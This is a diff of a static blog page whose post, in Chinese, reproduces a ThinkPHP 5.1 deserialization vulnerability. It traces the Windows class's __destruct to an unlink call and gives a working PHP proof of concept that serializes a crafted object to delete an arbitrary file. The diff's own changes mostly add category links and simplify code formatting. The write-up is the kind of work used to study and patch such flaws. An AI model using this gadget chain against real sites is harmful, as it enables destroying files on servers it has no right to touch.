@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                    <b>#</b> PHP漏洞
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -202,40 +223,40 @@
 <p>接下来全局搜索魔法函数 <code>__destruct</code>,出现了四个结果</p>
 <p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234436994.png" alt="image-20210708234436994"></p>
 <p>发现只有Windows.php下的函数有利用价值</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处是个好东西</span>
+<pre><code class="php">public function __destruct()
+&#123;
+    $this-&gt;close();
+    $this-&gt;removeFiles();//此处是个好东西
 
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+&#125;
+</code></pre>
 <p>跟进<code>removeFiles()</code>之后，发现该方法依然在windows这个class里</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//发现用到了$files这个attribute</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检测如果这个文件存在</span>
-            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//则删除这个文件</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">private function removeFiles()
+&#123;
+    foreach ($this-&gt;files as $filename) &#123;//发现用到了$files这个attribute
+        if (file_exists($filename)) &#123;//检测如果这个文件存在
+            @unlink($filename);//则删除这个文件
+        &#125;
+    &#125;
+    $this-&gt;files = [];
+&#125;
+</code></pre>
 <p>这意味着我们可以构造$files，让他执行<code>removeFiles()</code>来删除任意文件</p>
 <h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>坑点一：需要注意的是，我们需要使用与Windows类相同的namespace（命名空间），我没加，导致在这卡了好久好久。</p>
 <p>坑点二：序列化后的对象用<code>file_put_contents()</code>打出来乱码，发现是加了<code>namespace</code>后就会乱码，具体原因没有深入探究，改用echo就好了。</p>
 <p>坑点三：加入<code>namespace</code>后，private类型attribute的格式发生了变化，变成了<code>%00namespace\类名\%00属性名</code>，一个小诀窍，记不住可以右键–查看网页源代码</p>
 <p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210709000912218.png" alt="image-20210709000912218"></p>
 <p><strong>最后POC如下</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token comment">//一定要加，这是一个大坑</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pipes</span><span class="token punctuation">&#123;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"111.txt"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//要删除的文件</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">&lt;?php
+namespace think\process\pipes;//一定要加，这是一个大坑
+class Pipes&#123;
+&#125;
+class Windows extends Pipes
+&#123;
+    private $files = [&quot;111.txt&quot;];//要删除的文件
+&#125;
+echo(serialize(new Windows()));
+</code></pre>
 <h1 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h1><p>待更新。。</p>
 
       </div>
@@ -255,6 +276,23 @@
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                        <b>#</b> PHP漏洞
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
